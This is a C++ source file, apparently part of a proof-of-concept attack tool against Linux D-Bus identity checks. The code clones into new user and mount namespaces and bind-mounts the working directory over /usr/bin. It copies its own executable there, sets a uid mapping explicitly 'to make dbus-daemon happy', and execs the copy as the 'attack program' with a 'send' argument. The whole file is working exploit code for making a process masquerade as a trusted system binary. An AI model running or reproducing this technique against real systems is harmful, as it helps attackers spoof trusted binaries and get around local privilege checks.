#include "run.h"
#include <fmt/core.h>
#include <fstream>
#include <iostream>
#include <linux/limits.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

using fmt::format;
using std::cerr;
using std::cin;
using std::cout;
using std::endl;
using std::string;

static int prepare(string bin) {
  int ret = 0;
  char pwd[PATH_MAX + 1];
  auto getcwd_ret = getcwd(pwd, PATH_MAX + 1);
  if (getcwd_ret == nullptr) {
    cerr << "fail to get pwd" << endl;
    ret = -1;
  }

  cout << format("cloned: copy /proc/self/exe to \"{}/{}\", then chmod +x", pwd,
                 bin)
       << endl;

  std::ofstream bin_ofs(bin, std::ios::binary);
  std::ifstream self("/proc/self/exe", std::ios::binary);
  bin_ofs << self.rdbuf();
  bin_ofs.close();
  self.close();

  chmod(bin.c_str(), 0700);

  cout << format("cloned: mount pwd[{}] to /usr/bin", pwd) << endl;
  ret = mount(pwd, "/usr/bin", "bind", MS_BIND, nullptr);
  if (ret != 0) {
    cerr << format("fail to mount \"{}\" to \"/usr/bin\", errno={}", pwd, errno)
         << endl;
  }
  return ret;
}

static int do_clone(int (*fn)(void *), string bin) {
  // Allocate memory to be used for the stack of the child.
  const int kStackSize = (1024 * 1024);
  auto stack = reinterpret_cast<char *>(
      mmap(nullptr, kStackSize, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0));
  if (stack == MAP_FAILED) {
    cerr << "fail to map memory for child stack before clone" << endl;
    return EXIT_FAILURE;
  }

  // checkout `man clone`
  auto flags = CLONE_NEWNS | CLONE_NEWUSER | SIGCHLD;

  cout << "Do a clone syscall to create new user namespace and mnt namespace"
       << endl;
  auto pid = clone(fn, stack + kStackSize, flags, &bin);
  int ret = 0;
  int wstatus = 0;
  cout << format("start waiting cloned procress to exit [pid={}]", pid) << endl;
  ret = waitpid(pid, &wstatus, 0);
  if (ret != pid) {
    cerr << format("error waitpid, errno={}, wstatus={}", errno, wstatus)
         << endl;
    ret = -1;
  } else {
    ret = 0;
  }
  return ret;
}

static void set_uid_mapping() {

  cout << "cloned: set uid mapping to make dbus-daemon happy" << endl;
  std::ofstream uidMapFile("/proc/self/uid_map");
  uidMapFile << "1000 1000 1";
  uidMapFile.close();
  return;
}

static int cloned(void *args) {
  string bin = *reinterpret_cast<string *>(args);
  int ret = 0;
  cout << "cloned: Now I have CAP_SYS_ADMIN in this new user namespace. So I "
          "can manipulate the mount namespace I just created"
       << endl;

  ret = prepare(bin);
  if (ret != 0) {
    cerr << "cloned: fail to prepare binary" << endl;
    return ret;
  }

  set_uid_mapping();
  bin = "/usr/bin/" + bin;
  cout << format("cloned: now I exec {}", bin) << endl;
  char *const attack_args[] = {strdup(bin.c_str()), strdup("send"), nullptr};

  ret = execv(bin.c_str(), attack_args);
  cerr << format("fail to exec attack program after clone, errno={}", errno)
       << endl;

  return ret;
}

static bool is_invaild_file_name(string bin) {
  return bin.rfind('\000') != string::npos || bin.rfind('/') != string::npos;
}

int subcmd_run(char **argv) {
  string bin = argv[0];
  if (is_invaild_file_name(bin)) {
    cerr << format("\"{}\" is not a vaild linux file name", bin) << endl;
    return -1;
  }
  return do_clone(cloned, bin);
}
